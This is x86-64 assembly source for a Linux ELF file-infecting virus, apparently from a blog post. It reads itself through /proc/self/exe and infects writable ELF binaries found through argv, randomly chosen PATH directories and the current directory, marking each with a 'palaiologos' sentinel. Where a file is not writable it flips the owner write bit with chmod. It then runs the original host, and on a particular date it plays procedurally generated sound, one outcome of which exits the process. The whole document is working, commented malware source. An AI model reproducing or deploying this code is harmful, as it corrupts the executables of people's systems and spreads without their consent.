format ELF64 executable
use64

; XXX: You have to set this to the resulting ELF file size manually.
SIZE equ 1434

; XXX: You have to set this to the position of the "palaiologos" string
; in the binary yourself.
SENTINEL_LOC equ 120

sys_execve equ 59
sys_open equ 2
sys_lseek equ 8
sys_memfd_create equ 319
sys_sendfile equ 40
sys_close equ 3
sys_exit equ 60
sys_getdents equ 78
sys_access equ 21
sys_stat equ 4
sys_chmod equ 90

entry _start

sentinel: db 'palaiologos',0
memfd_path: db '/proc/self/fd/',0,0
self: db '/proc/self/exe'
snddev: db "/dev/dsp1", 0
pathsep: db "/", 0
empty: db 0
size: dq SIZE
seed: dq 0
ldays:
    dd -1, 30, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334, 365
days:
    dd -1, 30, 58, 89, 119, 150, 180, 211, 242, 272, 303, 333, 364

LCG_A equ 1103515245
LCG_B equ 12345

load_elf:
    ; Open ourselves.
    xor esi, esi
    mov edi, self
    push sys_open
    pop rax
    syscall
    ; Obtain the length: seek to back.
    mov r8, rax
    mov rdi, r8
    push sys_lseek
    pop rax
    syscall
    ; Call memfd_create, call with MFD_CLOEXEC.
    mov edi, empty
    push 1
    pop rsi
    push sys_memfd_create
    pop rax
    syscall
    ; Copy the file contents to the memfd using sendfile.
    mov edx, size
    mov r9, rax
    mov rdi, rax
    mov rsi, r8
    sub r10d, SIZE
    push sys_sendfile
    pop rax
    syscall
    ; Close the file descriptor we hold to our own binary.
    push sys_close
    pop rax
    mov rdi, r8
    syscall
    ; Bravely assume that the memfd descriptor number is a single digit.
    ; This might or might not work all of the times, but improving upon
    ; this is trivially beyond the scope of this post.
    add r9d, 48
    mov BYTE [memfd_path + 14], r9b
    ret

; The entry point.
_start:
    ; Load the executable to a memfd.
    call load_elf
    ; Load the argp for the first payload.
    mov rdi, [rsp]
    lea rdi, [rsp + 8 + rdi * 8 + 8]
    call infect_path
    ; Load the argv for the second payload.
    lea rbx, [rsp + 8]
    call infect_argv
    ; Infect the current directory as the third payload.
    call infect_selfdir
    ; Call the final birthday payload.
    call birthday
    ; Load the path to the executable
    mov rdi, memfd_path
    ; Prepare to call execve
    ; Load argc + argv
    lea rsi, [rsp + 8]
    ; Load argp
    mov rdx, [rsp]
    lea rdx, [rsp + 8 + rdx * 8 + 8]
    ; Perform the syscall
    push sys_execve
    pop rax
    syscall
    ; Exit in case execve returns due to error.
    mov rdi, -1
    push sys_exit
    pop rax
    syscall

infect_argv:
    ; Load two constants related to access() to
    ; avoid having to reload them in the loop.
    ; We're interested in the syscall number
    ; and the two arguments specifying access
    ; mode.
    push sys_access
    pop r14
    push 6 ; R_OK | W_OK
    pop r15
.argv_loop:
    ; We could use argc, but we can also assume
    ; that argv is terminated with a NULL.
    mov rdi, qword [rbx]
    test rdi, rdi
    je .done
    ; Check if we can infect the file. Don't bother
    ; trying to tweak the permissions.
    mov rsi, r15
    mov rax, r14
    syscall
    ; access() returned nonzero -> we can't infect
    test eax, eax
    jne .skip_infect
    ; Load the path to the executable and infect it.
    mov rdi, qword [rbx]
    call infect
.skip_infect:
    ; Skip to the next pointer in the argv array.
    add rbx, 8
    jmp .argv_loop
.done:
    ret

infect_selfdir:
    ; Reserve some space on the stack.
    sub rsp, 40
    ; Load the first buffer with PATH=.
    lea rax, [rsp + 9]
    mov dword [rax], 'PATH'
    mov word [rax + 4], '=.'
    mov byte [rax + 6], 0
    ; Write the buffer as the first entry and NULL-terminate the
    ; artificial ARGP.
    lea rdi, [rsp + 16]
    mov qword [rdi], rax
    and qword [rdi + 8], 0
    ; Infect.
    call infect_path
    add rsp, 40
    ret

; Wants to be called with argp in rdi.
infect_path:
    ; Reserve a (somewhat arbitrary) amount of stack space.
    ; It needs to hold a few path buffers (3 buffers, 4096 bytes each)
    sub rsp, 12456
    ; Query the current time stamp counter as a source of randomness.
    ; rdtsc will set rdx and rax to the higher and lower bits of the time
    ; stamp counter, so we put them together and store them in the RNG seed
    ; variable.
    rdtsc
    shl rdx, 32
    or rdx, rax
    mov qword [seed], rdx
    ; Find "PATH=" in ARGP.
.path_find_loop:
    ; NULL terminates argp, check for this.
    mov rax, qword [rdi]
    test rax, rax
    je .infect_done
    ; Load the first five bytes of the current string.
    ; If any of them is NUL, we skip to the next string.
    mov cl, byte [rax]
    test cl, cl
    je .path_loop_skip
    mov dl, byte [rax + 1]
    test dl, dl
    je .path_loop_skip
    mov bl, byte [rax + 2]
    test bl, bl
    je .path_loop_skip
    mov sil, byte [rax + 3]
    test sil, sil
    je .path_loop_skip
    mov r8b, byte [rax + 4]
    test r8b, r8b
    je .path_loop_skip
    ; Check if the ASCII values are right.
    cmp cl, 'P'
    jne .path_loop_skip
    cmp dl, 'A'
    jne .path_loop_skip
    cmp bl, 'T'
    jne .path_loop_skip
    cmp sil, 'H'
    jne .path_loop_skip
    cmp r8b, '='
    je .path_found
.path_loop_skip:
    ; Go to the next pointer in the argp array.
    add rdi, 8
    jmp .path_find_loop
.path_found:
    add rax, 5
    ; Select the final path buffer.
    lea r12, [rsp + 4256]
    ; Load a few auxiliary constants.
    push 3
    pop rbx
    push sys_open
    pop r8
.path_loop:
    ; Check if we've hit the end of the PATH variable.
    mov cl, byte [rax]
    test cl, cl
    je .infect_done
    ; Copy path until : or \0 is found.
    xor r13d, r13d
.copy_path:
    test cl, cl
    je .attempt_scan
    cmp cl, ':'
    je .attempt_scan
    mov byte [rsp + r13 + 160], cl
    mov cl, byte [rax + r13 + 1]
    inc r13
    jmp .copy_path
.attempt_scan:
    ; NUL-terminate the path.
    mov ecx, r13d
    mov byte [rsp + rcx + 160], 0
    xor ecx, ecx
    ; Check if we have to skip an extra colon.
    cmp byte [rax + r13], ':'
    sete cl
    add rcx, rax
    ; Decide whether we want to infect this directory.
    ; Take a random number from a linear congruential generator
    ; and divide it by three. The modulus of zero means "no".
    imul rax, qword [seed], LCG_A
    add rax, LCG_B
    mov qword [seed], rax
    xor edx, edx
    div rbx
    test rdx, rdx
    je .next_path
    ; O_RDONLY | O_DIRECTORY
    mov esi, 0x10000
    lea rdi, [rsp + 160]
    mov rax, r8
    ; Preserve rcx through the system call.
    mov qword [rsp], rcx
    syscall
    mov rcx, qword [rsp]
    ; Clever way to determine whether the number is negative.
    bt eax, 31
    jb .next_path
    ; Save the file descriptor.
    mov qword [rsp + 8], rax
    ; Copy the file descriptor elsewhere, because we are going to use
    ; it now, and it would be a shame if a syscall clobbered it ;).
    mov rbp, rax
.getdents_loop:
    ; Load max path size.
    mov edx, 4096
    ; Load the directory file descriptor.
    mov rdi, rbp
    ; Load the buffer address.
    lea rsi, [rsp + 8352]
    push sys_getdents
    pop rax
    syscall
    ; Jump to some common error stub that will close the
    ; directory descriptor in case of failure.
    test eax, eax
    je .getdents_err
    ; Preserve the amount of entries somewhere.
    ; eax is often trashed by system calls so we want to
    ; avoid it being lost.
    mov r14d, eax
    xor eax, eax
.dir_loop:
    ; Load the current entry number, directory entries buffer
    ; and the random seed.
    mov r15d, eax
    lea rbx, [rsp + r15]
    add rbx, 8352
    mov rax, qword [seed]
.discard_loop:
    ; Done processing?
    cmp r14, r15
    jbe .getdents_loop
    ; Extract the type of the directory entry.
    movzx ecx, word [rbx + 16]
    mov dl, byte [rbx + rcx - 1]
    ; Skip if not a regular file or a symlink.
    and dl, -3
    cmp dl, 8
    jne .give_up
    ; Invoke the LCG again. Skip the entry upfront if dividing by
    ; four gives modulus 0, that is, last two binary digits of the
    ; number are 0.
    imul rax, rax, LCG_A
    add rax, LCG_B
    mov qword [seed], rax
    test al, 3
    je .discard_loop
    ; OK, first nul-terminate the final buffer with the filename
    ; so that the `concat` function can work properly. Then append the
    ; directory name to that empty final buffer.
    mov byte [rsp + 4256], 0
    mov rdi, r12
    lea rsi, [rsp + 160]
    call concat
    ; We need to terminate the path with a slash only if it is not present
    ; already. Check this. Use a dumb strlen-ish function.
    mov rax, r12
.len_loop:
    cmp byte [rax], 0
    je .len_ok
    inc rax
    jmp .len_loop
.len_ok:
    ; Slash?
    cmp byte [rax - 1], '/'
    je .has_slash
    mov esi, pathsep
    mov rdi, r12
    call concat
.has_slash:
    ; Append the file name now.
    lea rsi, [rbx + 18]
    mov rdi, r12
    call concat
    ; Check if we can access the file for reading and writing.
    mov rdi, r12
    push 6 ; R_OK | W_OK
    pop rsi
    push sys_access
    pop rax
    syscall
    mov rcx, rax
    ; Decide whether we want to infect this file anyway.
    ; Same LCG and division stuff, except this time with the
    ; modulus of 10.
    imul rax, qword [seed], LCG_A
    add rax, LCG_B
    mov qword [seed], rax
    xor edx, edx
    push 10
    pop rsi
    div rsi
    ; Proceed only if:
    ; (1) the file is not accessible
    ; (2) we want to infect it
    ; Handle a special case here: try to add an owner
    ; write permission bit to the file and see if this lets
    ; us access it... :). Might protect against some
    ; "overzealous" (removes write permissions on critical
    ; executables to avoid problems) but not "overly paranoid"
    ; (removes write permissions /and/ transfers ownership) users.
    ; In that case we can do nothing but hope that we get root somehow.
    test ecx, ecx
    je .normal_path
    test rdx, rdx
    jne .normal_path
    ; Stat the file.
    mov rdi, r12
    lea rsi, [rsp + 16]
    push sys_stat
    pop rax
    syscall
    ; Set the owner write permission bit and call chmod.
    mov esi, dword [rsp + 40]
    or rsi, 128
    mov dword [rsp + 40], esi
    mov rbp, r12
    push sys_chmod
    pop r12
    mov rax, r12
    syscall
    ; Try to access again?
    mov rdi, rbp
    push 6 ; R_OK | W_OK again.
    pop rsi
    push sys_access
    pop rax
    syscall
    ; Still no? Restore the permissions.
    test eax, eax
    jne .restore_perms
    ; Yes => do infect.
    mov rdi, rbp
    call infect
.restore_perms:
    mov esi, dword [rsp + 40]
    and esi, -129 ; Everything except the bit 7
    mov dword [rsp + 40], esi
    mov rdi, rbp
    mov rax, r12
    syscall
    ; File still not accessible. Give up.
    ; Load the directory descriptor.
    mov rax, qword [rsp + 8]
    mov r12, rbp
    mov rbp, rax
    jmp .give_up
.normal_path:
    ; Check if we want to infect this file.
    test rdx, rdx
    jne .give_up
    ; Do infect.
    mov rdi, r12
    call infect
.give_up:
    ; We end up here when it's time to skip to
    ; the next directory entry.
    movzx ecx, word [rbx + 16]
    movzx eax, cx
    add eax, r15d
    jmp .dir_loop
.getdents_err:
    ; We get here when it's time to close the
    ; directory descriptor and move on.
    mov rdi, rbp
    push sys_close
    pop rbx
    mov rax, rbx
    syscall
    ; Load the sys_open constant again
    push sys_open
    pop r8
    mov rcx, qword [rsp]
.next_path:
    ; Go to the next path to process
    add rcx, r13
    mov rax, rcx
    jmp .path_loop
.infect_done:
    ; Balance the stack and yield.
    add rsp, 12456
    ret

concat:
    ; Find the end of the first string.
    cmp byte [rdi], 0
    lea rdi, [rdi + 1]
    jne concat
    ; Start appending characters in a loop.
    push -1
    pop rax
.do_loop:
    ; Nothing left in the source string.
    mov cl, byte [rsi + rax + 1]
    test cl, cl
    je .done
    mov byte [rdi + rax], cl
    inc rax
    jmp .do_loop
.done:
    ; Null-terminate the string.
    mov byte [rdi + rax], 0
    ret

infect:
    ; Preserve a bunch of registers that the caller function needs.
    push r15
    push r14
    push rbx
    ; Reserve enough space for the transaction buffer.
    sub rsp, 200 + SIZE
    ; Open the goat file w/ O_RDWR.
    mov rbx, sys_open
    mov rsi, rbx
    mov rax, rbx
    syscall
    ; Check if the file was opened successfully.
    bt eax, 31
    jb .cleanup
    ; Read the ELF header.
    mov r8d, eax
    lea rsi, [rsp - 112]
    ; Size of the ELF header.
    mov rdx, 64
    mov rdi, r8
    ; sys_read = 0
    xor eax, eax
    syscall
    ; Check machine type (AMD64, code 62)
    cmp word [rsi + 18], 62
    jne .elf_bad
    ; ELF class (64-bit)
    cmp byte [rsp - 108], 2
    jne .elf_bad
    ; Check the 0x7f ELF magic.
    cmp byte [rsp - 109], 'F'
    jne .elf_bad
    cmp byte [rsp - 110], 'L'
    jne .elf_bad
    cmp byte [rsp - 111], 'E'
    jne .elf_bad
    cmp byte [rsp - 112], 0x7F
    jne .elf_bad
    ; Rewind to the SENTINEL_LOC-th byte. We want to check
    ; if this ELF file was already infected.
    mov r9, sys_lseek
    mov rsi, SENTINEL_LOC
    mov rdi, r8
    xor edx, edx
    mov rax, r9
    syscall
    ; Read 12 bytes (length of "palaiologos\0")
    lea rsi, [rsp - 128]
    mov rdx, 12
    xor eax, eax
    syscall
    ; Check if the sentinel is present.
    movq xmm0, qword [rsi]
    movq rax, xmm0
    ; Check the first part.
    mov rcx, 'palaiolo'
    cmp rax, rcx
    jne .elf_clean
    ; Check the remaining bytes: gos\0
    cmp byte [rsp - 120], 'g'
    jne .elf_clean
    cmp byte [rsp - 119], 'o'
    jne .elf_clean
    cmp byte [rsp - 118], 's'
    jne .elf_clean
    cmp byte [rsp - 117], 0
    jne .elf_clean
.elf_bad:
    ; Close ourselves and return. Already infected.
    mov rax, 3
    mov rdi, r8
    syscall
    jmp .cleanup
.elf_clean:
    ; Open self.
    mov edi, self
    xor esi, esi
    mov rax, rbx
    syscall
    ; Open a memfd with O_CLOEXEC.
    mov r10d, eax
    mov r14, 1
    mov edi, empty
    mov eax, sys_memfd_create
    mov rsi, r14
    syscall
    ; Copy over the viral stub from ourselves to the memfd.
    mov ebx, eax
    lea r15, [rsp - 48]
    mov edx, SIZE
    mov rdi, r10
    mov rsi, r15
    xor eax, eax
    syscall
    mov edx, SIZE
    mov rdi, rbx
    mov rax, r14
    syscall
    ; Seek to the beginning of the goat file (we want the ELf header back).
    mov rdi, r8
    xor esi, esi
    xor edx, edx
    mov rax, r9
    syscall
    ; Copy data from the goat file to the memfd in a loop.
.copy_goat_memfd:
    mov edx, SIZE
    mov rdi, r8
    mov rsi, r15
    xor eax, eax
    syscall
    test eax, eax
    je .copy_goat_memfd_done
    mov edx, eax
    mov rdi, rbx
    mov rsi, r15
    mov rax, r14
    syscall
    jmp .copy_goat_memfd
    ; Rewind the goat file and the memfd.
.copy_goat_memfd_done:
    mov rdi, rbx
    xor esi, esi
    xor edx, edx
    mov rax, r9
    syscall
    mov rdi, r8
    xor esi, esi
    xor edx, edx
    mov rax, r9
    syscall
    ; Overwrite the goat file with the memfd contents.
    lea rsi, [rsp - 48]
.copy_memfd_goat:
    mov edx, SIZE
    mov rdi, rbx
    xor eax, eax
    syscall
    test eax, eax
    je .copy_memfd_goat_done
    mov edx, eax
    mov rdi, r8
    mov rax, r14
    syscall
    jmp .copy_memfd_goat
.copy_memfd_goat_done:
    ; Close goat, memfd, and self.
    mov rdx, sys_close
    mov rdi, rbx
    mov rax, rdx
    syscall
    mov rdi, r8
    mov rax, rdx
    syscall
    mov rdi, r10
    mov rax, rdx
    syscall
.cleanup:
    ; Balance the stack and quit.
    add rsp, 200 + SIZE
    pop rbx
    pop r14
    pop r15
    ret

sys_time equ 201

birthday:
    ; Ask for the current UNIX time.
    mov eax, sys_time
    xor edi, edi
    syscall
    ; Determine whether we are dealing with a
    ; leap year. We want to obtain the divmod of
    ; the UNIX time stamp and four years expressed in
    ; seconds (1461 * seconds in a day) = (1461 * 24 * 60 * 60)
    ; = 126230400
    mov ecx, eax
    mov esi, 126230400
    xor edx, edx
    div esi
    imul rax, rax, -126230400
    add rax, rcx
    ; Determine the correct year in the four year interval.
    ; If the quotient result of divmod is less than a year,
    ; just ignore the entire thing.
    ; 31536000 is the amount of seconds in a year.
    cmp rax, 31536000
    jl .year_ok
    ; Check if we're in the 2nd year of the 4 year interval.
    ; Easy to notice that this constant is the amount of seconds
    ; in two years.
    cmp rax, 63072000
    jb .sub_year
    ; Same logic as above except three years.
    ; There's a twist though: we need to account for a leap day.
    ; The logic for leap days is way different...
    cmp rax, 94694400
    jb .is_leap
    ; Leap year: subtract 3 years worth of seconds and add a leap day.
    sub rax, 94694400
    jmp .year_ok
.sub_year:
    ; Subtract a year's worth of seconds.
    sub rax, 31536000
.year_ok:
    ; Calculate days since 01/01.
    mov ecx, 86400
    xor edx, edx
    div rcx
    cdqe
    ; Load the running total of days in each month.
    mov rcx, days
.determine_month:
    push -1
    pop rdx
.month_loop:
    ; Bump up the month until exceeded days since 01/01.
    lea esi, [rdx + 2]
    movsxd rsi, dword [rcx + 4 * rsi]
    inc edx
    cmp rax, rsi
    jg .month_loop
    ; Save the month value for later.
    mov esi, edx
    ; Load the day of month.
    movsxd rcx, dword [rcx + 4 * rsi]
    sub rax, rcx
    ; Check if the day and month match.
    cmp rax, 9
    jne .heck
    cmp edx, 7
    jne .heck
    ; Pick a random number and proceed only with 10% certainty...
    imul rax, qword [rip + seed], LCG_A
    add rax, LCG_B
    mov qword [rip + seed], rax
    push 10
    pop rcx
    xor edx, edx
    div rcx
    test rdx, rdx
    je proceed
.heck:
    ret
.is_leap:
    ; Compute day of year and load the leap days LUT.
    sub eax, 63072000
    mov ecx, 86400
    xor edx, edx
    div ecx
    mov rcx, ldays
    jmp .determine_month

proceed:
    ; Open the sound device.
    mov rax, 2
    mov r8, 1
    mov edi, snddev
    mov rsi, r8
    syscall
    ; Play the "suspense" sound.
    mov edi, eax
    xor ebp, ebp
    ; Load the place on the stack where the sample is saved.
    lea rsi, [rsp - 4]
    xor ebx, ebx
.susp_loop:
    ; 58000 ticks.
    cmp ebx, 58000
    je .susp_done
    ; Generate the sample.
    mov ecx, ebx
    shr ecx, 13
    and cl, 27
    mov eax, 322376503
    shr eax, cl
    and eax, 127
    imul eax, ebx
    mov ecx, ebx
    shr ecx, 4
    or ecx, ebp
    or ecx, eax
    ; Save and write.
    mov dword [rsp - 4], ecx
    mov rdx, r8
    mov rax, r8
    syscall
    ; Loop again.
    inc ebx
    add ebp, 32
    jmp .susp_loop
.susp_done:
    ; Purposefully waste some CPU cycles for delay.
    mov eax, 100000
.busy:
    sub eax, 1
    jb .busydone
    nop
    jmp .busy
.busydone:
    ; Roll a dice. 33% chance of playing the "doomy" sound.
    imul rax, qword [seed], LCG_A
    add rax, LCG_B
    mov qword [seed], rax
    xor ebp, ebp
    mov r9, 3
    xor edx, edx
    div r9
    test rdx, rdx
    je .doomy
    ; Generate the "good" samples!
    mov r10d, 1
    mov ebx, 8
    mov ebp, 13
    lea rsi, [rsp - 12]
    mov r14d, 12
    ; The song is procedurally generated in stages three stages:
    ; stage 0, stage 1 and stage 2.
.good_main:
    cmp r10d, 106000
    je .good_done
    mov eax, ebp
    mov ecx, ebx
    cmp r10d, 35000
    jb .good0
    cmp r10d, 67499
    ja .good1
    lea ecx, [r10 + 8 * r10]
    mov eax, ebp
    jmp .good0
.good1:
    cmp r10d, 83999
    ja .good2
    lea ecx, [r10 + 8 * r10]
    mov eax, r14d
    jmp .good0
.good2:
    lea ecx, [8*r10]
    cmp r10d, 98000
    mov eax, ebp
    sbb eax, 0
.good0:
    mov edx, r10d
    shr edx, 2
    imul eax, r10d
    add eax, edx
    mov edx, r10d
    shr edx, 3
    or edx, ecx
    mov ecx, r10d
    shr ecx, 5
    or ecx, edx
    or ecx, eax
    ; Write the sample.
    mov dword [rsp - 12], ecx
    mov rdx, r8
    mov rax, r8
    syscall
    inc r10d
    add ebx, 8
    jmp .good_main
.good_done:
    ; Close file descriptor.
    mov rax, r9
    syscall
    jmp .cleanup
.doomy:
    ; "Doomy" track.
    lea rsi, [rsp - 8]
.doomy_loop:
    cmp ebp, 250000
    je .doomy_quit
    mov eax, ebp
    shr eax, 11
    mov ecx, ebp
    shr ecx, 1
    or ecx, eax
    imul eax, ecx, 430
    ; Write the sample.
    mov dword [rsp - 8], eax
    mov rdx, r8
    mov rax, r8
    syscall
    add ebp, 5
    jmp .doomy_loop
.doomy_quit:
    ; Exit with code 0.
    mov rax, 60
    xor edi, edi
    syscall
.cleanup:
    ret
